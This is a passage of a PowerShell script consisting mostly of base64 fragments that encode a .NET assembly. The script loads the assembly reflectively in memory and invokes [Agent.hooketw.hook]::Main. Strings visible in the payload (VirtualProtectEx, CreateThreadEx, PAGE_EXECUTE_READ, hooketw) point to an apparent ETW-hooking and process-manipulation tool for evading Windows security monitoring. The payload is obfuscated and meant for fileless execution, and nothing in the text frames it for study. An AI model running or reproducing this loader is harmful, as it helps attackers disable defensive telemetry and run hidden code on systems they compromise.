AAABABQEAAACAAcMAAADAEEJAAAEAD4IAAAFAGQIAAABANYLAAACAJ4EAAADABAIAAAEACsPAAAF','DcmVhdGVUaHJlYWRFeABSdGxDcmVhdGVQcm9jZXNzUGFyYW1ldGVyc0V4AFZpcnR1YWxQcm90ZWN0RXgAT','l6ZQBjYlNpemUAbHBSZXR1cm5TaXplAGxwU2l','IGCAIGDgIGBgMGERwCBgICBhkCBg','dGgATWF4aW11bUxlbmd0aABUaHJlYWRJbmZv','QnVmZmVyU2l6ZQBDb21taXRTaXplAGxwZHdTaXplAFZpZXdTaXplAE1heFNpemUAU3l','EsM/QAfAAAAAACAAJMgdwETASoAAAAAAIAAkyD+BBcBKgAAAAAAgA','QBAAV4ACQBEAUAACQBIAUUACQBMAYEACQBQAUoACQBUAWMA','AAuADAALgAwAAAAvGMAAOoBAAAAAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249','AAAAAAGIAbABvAGMA','mljZQBCeXRlc0xlZnRUaGlzTWVzc2FnZQBBZ2VudC5QSW52b2tlAGdldF9IYW','AAmAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAIAAAAACAAAALAAAAAAAAAAAA','AG8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgACAAMgAwADIAMAAAACoAAQABAEwAZQBnAGEAb','BOdGRsbABTeXN0ZW0ARW51bQBscE51bWJlck9mQnl0ZXNXcml0dGVuAE1haW','DAPYHAAABAGEEAAACAHIEAAADAJEIAAAEAPwMAAABABIDAAACACEMAAADAF4LAAA','GoIjQADADwPigADAMYEig','BgYEAkYBQACCRgJBAABAhgFAAIBGAgJAAUCGBgYCRAJCAAFGBgYCQgICgAFAhgYHQUIEBgJA','AAAEACIEAAAFAB8MACAGADEEAAAHALALACAAAAAAAAABALQEAAACANYEAAADAEoLAAA','BSAAAAAACAAJMgfgx1AVIAAAA','AAwNAAADAHkHAAAEAJINAgAFAGcNAQABAGcMAQACAJIL','ldHcuZXhlAGR3WFN','BJTkZPRVgA','AAAA//8AALg','AAAAAAAAQAAAAAAAAAAAAAAAAAAAAUlNEUy9c631mrQdIt1Js29x7iXUBAAAAQzpcVXNlcnNcYWRtaW5cRG93bmxvYWRzX','pwADADwKigAD','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','kFTSUNfSU5GT1JNQVRJT04AUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTgBQUk9DRVNTX0lORk9STUFUSU9OAFNUQVJUVVBJTkZPAEdldENvbnNvbGVPdXRwdXRDUABPQkpFQ1RfQVRUUklCVVRFUwBTRUNVUklUWV9BVFRSSUJVVEVTAEh','ZGxsLmRsbA','WgNYAtgBWgAkCtgBWgH0AtgB','mFtZQBscEFwcGxpY2F0aW9uTmFtZQBPYmplY3ROYW1lAG5hbWUAbHBDb21tYW5kTGluZQBBcGNSb3V0aW5lAE5vbmUAaFJlYWRQaXBlAFBlZWtOYW1lZFBpcGUAQ3JlYXRlUGlwZQBoV3JpdGVQaXBlAFZhbHVlVHlwZQBmbEFsbG9jYXRpb25UeXBlAFRlcm1pbmF','AAAAAAAAAAAAAAAAAAAAAAAAAAA','LgBrAJsCLgBzAKgCAwJ7AE','AA','AAUQBgChAAWQBgChAAYQBgChUAaQ','GgKigADAE4DigADAFkMigADAAUDigAG','ZGVud','AAAAAAAAAAAAAAAAA','tgBWgGEAtgBWgOUAtgBWgBgCtgBWgL0BtgBWgPsBtgB','QAAQAABAACAAAEAAQAAAQAEAAABAAAEAAEA','FjY2VzcwBwcm9jZXNzQWN','AQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlw','4AVGhyZWFkSW5mb3JtYXRpb24AUXVlcnlMaW1pdGVkSW5mb3JtYXRpb24AU2V0SGFuZGxlSW5mb3JtYXRpb24AbHBQcm9jZXNzSW5mb3JtYXRpb24AcHJvY2Vzc0luZm9ybWF0aW9uAFN','cm1hdGlvbkxlbmd0aABwcm9jZXNzSW5mb3JtYXRpb25MZW5ndGgAUmV0dXJuTGVuZ3RoAHJldHVybkxlbmd0aABsZW5ndGgAaG9vawBkd01hc2sAQWZmaW5pdHlNYXNrAE','uc','AAAAAAAAAAAAAAAQAAAAAArAMAAJBgAAAcAwAAAAAAAAAAAAAcAzQAAABWAFMAXwBWAEUAUgBTAEkA','XVlc3RlZ','AAAAEwAAAFcAAAApAAAAnAAAABMAAAAe','AAAQABAAAAaAAAgAAA','1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MiI+DQogICAgPHNlY3VyaXR','JMgGgMEApYAAAAAAIAAliCuCQ4CmwDbIAAAAACGGGAKBgCdAOMgAAAAAIYYYAoGAJ0AAAABAJoLAgABAPQEAgACABcF','mZmVy','gICAgPHJlcXVlc3RlZFByaXZpbGVnZXMgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICAgICAgPHJlc','BgBTDcUIBgAeCm0OBgAiBcUIBgBeBsUIBgDMCMUICgCiDKgKBgD4BsUIBgB7CsUIAAAAAFgAAAAAAAEAAQABABAAeAiODkEAAQABAAAAEAAgAHwDQQABAAMABQAQAA4AAABBAAEABAAFABAAvwgAAEEAAQAaAA0BEABXAQAASQABACkADQERAGsBAABJAAUAKQANAREA6QEAAEkAFwApAA0BEACcAQAASQAZACkADQEQAD','FwAAC','kF0dHJpYnV0ZQBGbGFnc0F0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','Ab','AAQPAQAAASUA','wACARARMA4KAAQJGBgQETAQGAoAAwkQETQQETACCgAECRgQETQJ','XAQASQ29weXJpZ2h0IMKpICAyMDIwAAApAQAkZGFlZGY3YjMtODI2Mi00ODkyLWFkYzQtNDI1ZGQ1Zjg1YmNhA','UNDRVNTAERVUExJQ0FURV9TQU1','FwY0FyZ3VtZW50MwA8TW9kdWxlPgBQQUdFX0VYRUNVVEVfUkVBRABDTElFTlRfSUQAUEFHRV9HVUFSRAB','DEEAAADAJACACAAAAAAAAABAOoDAAACAKIDAAADAP8D','dABTZWN0aW9uT2Zmc2V0AG9w','Dj0BOwAAAAAAgACTIBYPRgFAAAAAAACA','gAw','IGGA','RkLCLd6XFYZNOCJBP8PH','AEEAIgApAA0BEAAJAQAASQAoACoADQEQABgBAABJACsAKgANARAAigEAAEkALgA','AUCGBgZCRAJCQAEAhgIEkUQCAQAAQkYBQACGBgOBAABGA4KAAUJGAkQCwgQCQ8ACwkQGB','d','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','nA4BAEABJwAWDw','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','PAK4JAwAEgAAAAQAAAAAAAAAAAAAAA','dGlvb','EACYLAAAFABYLAAAGAG8LAAAHAMsNAAAIACkPAQAJAAYKAgAKACwJAAABAEAEAAACAEMKA','UACQAAAAAAgACTIFoF3gANAAAAAACAAJMgcgzpABQAAAAAAIAAkyC8A/EAFwAAAAAAgACTI','uY2hyb25pemUAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBTb3VyY2VTdHJpbmcAUnRsSW5pdFVuaWNvZGV','2tldHcucGRiAOdBAAAAAAAAAAAAAAFCAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADzQQAAAAAAAAAAAAAAAF9Db3JFeGVNYWluAG1zY29yZWUuZGxsAA','gYGBgYGBgYGAkMAAQJEBgJEB','Nlc3NBdHRyaWJ1dGVzAE9iamVjdEF0dHJpYnV0ZXMAZHdDcmVhdGlvbkZsYWdzAFByb2Nlc3NBY2Nlc3NGbGFncwBkd0ZsYWdzAGFyZ3MARHVwbG','6ZQBu','xlAGxwVGl0bGUAV2luZG93VGl0bGUAaE1vZHVsZQBwcm9jTmFtZQBNb2ROYW1lAFF1ZXJ5RnVsbFByb2Nlc3NJbWFnZU5hbWUAbHBFeGVOYW1lAEltYW','AJMg2Q5RAUUAAAAAAIAAk','AAliDqDnABUQDTIAAAAACGGGAKBg','AIAAABzAAAATEEAAEwjAAAAAAAAAAA','wAAATkAcAwDAAABOwCLCQMAAAE9AJs','BAAAAgAAAAAgAABAA','c3RlbS5SdW50aW1lLkludGVyb3','5Pg0','BsMJBgCmBsMJBgDBBcMJBgCWBcgKBgB0Bc','B0AGkAbwBuAAAAAAAAALAEfAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAWAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBlAG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAADoACQABAEYAaQBsAGUARAB','0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWx','gQChAKCQkJB','kDBhE8AgYHAwYRQAMGEUQDBhFIAwYRTAUAAQEdDgsABAIQGBAY','KlgADAEgOigADAGk','pdHlBdHRyaWJ1dGUAQnl0ZQBscFZhbHVlAGxwUHJldmlvdXNWYWx1ZQBTa')
    $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($bin64))
    [Agent.hooketw.hook]::Main("")
}


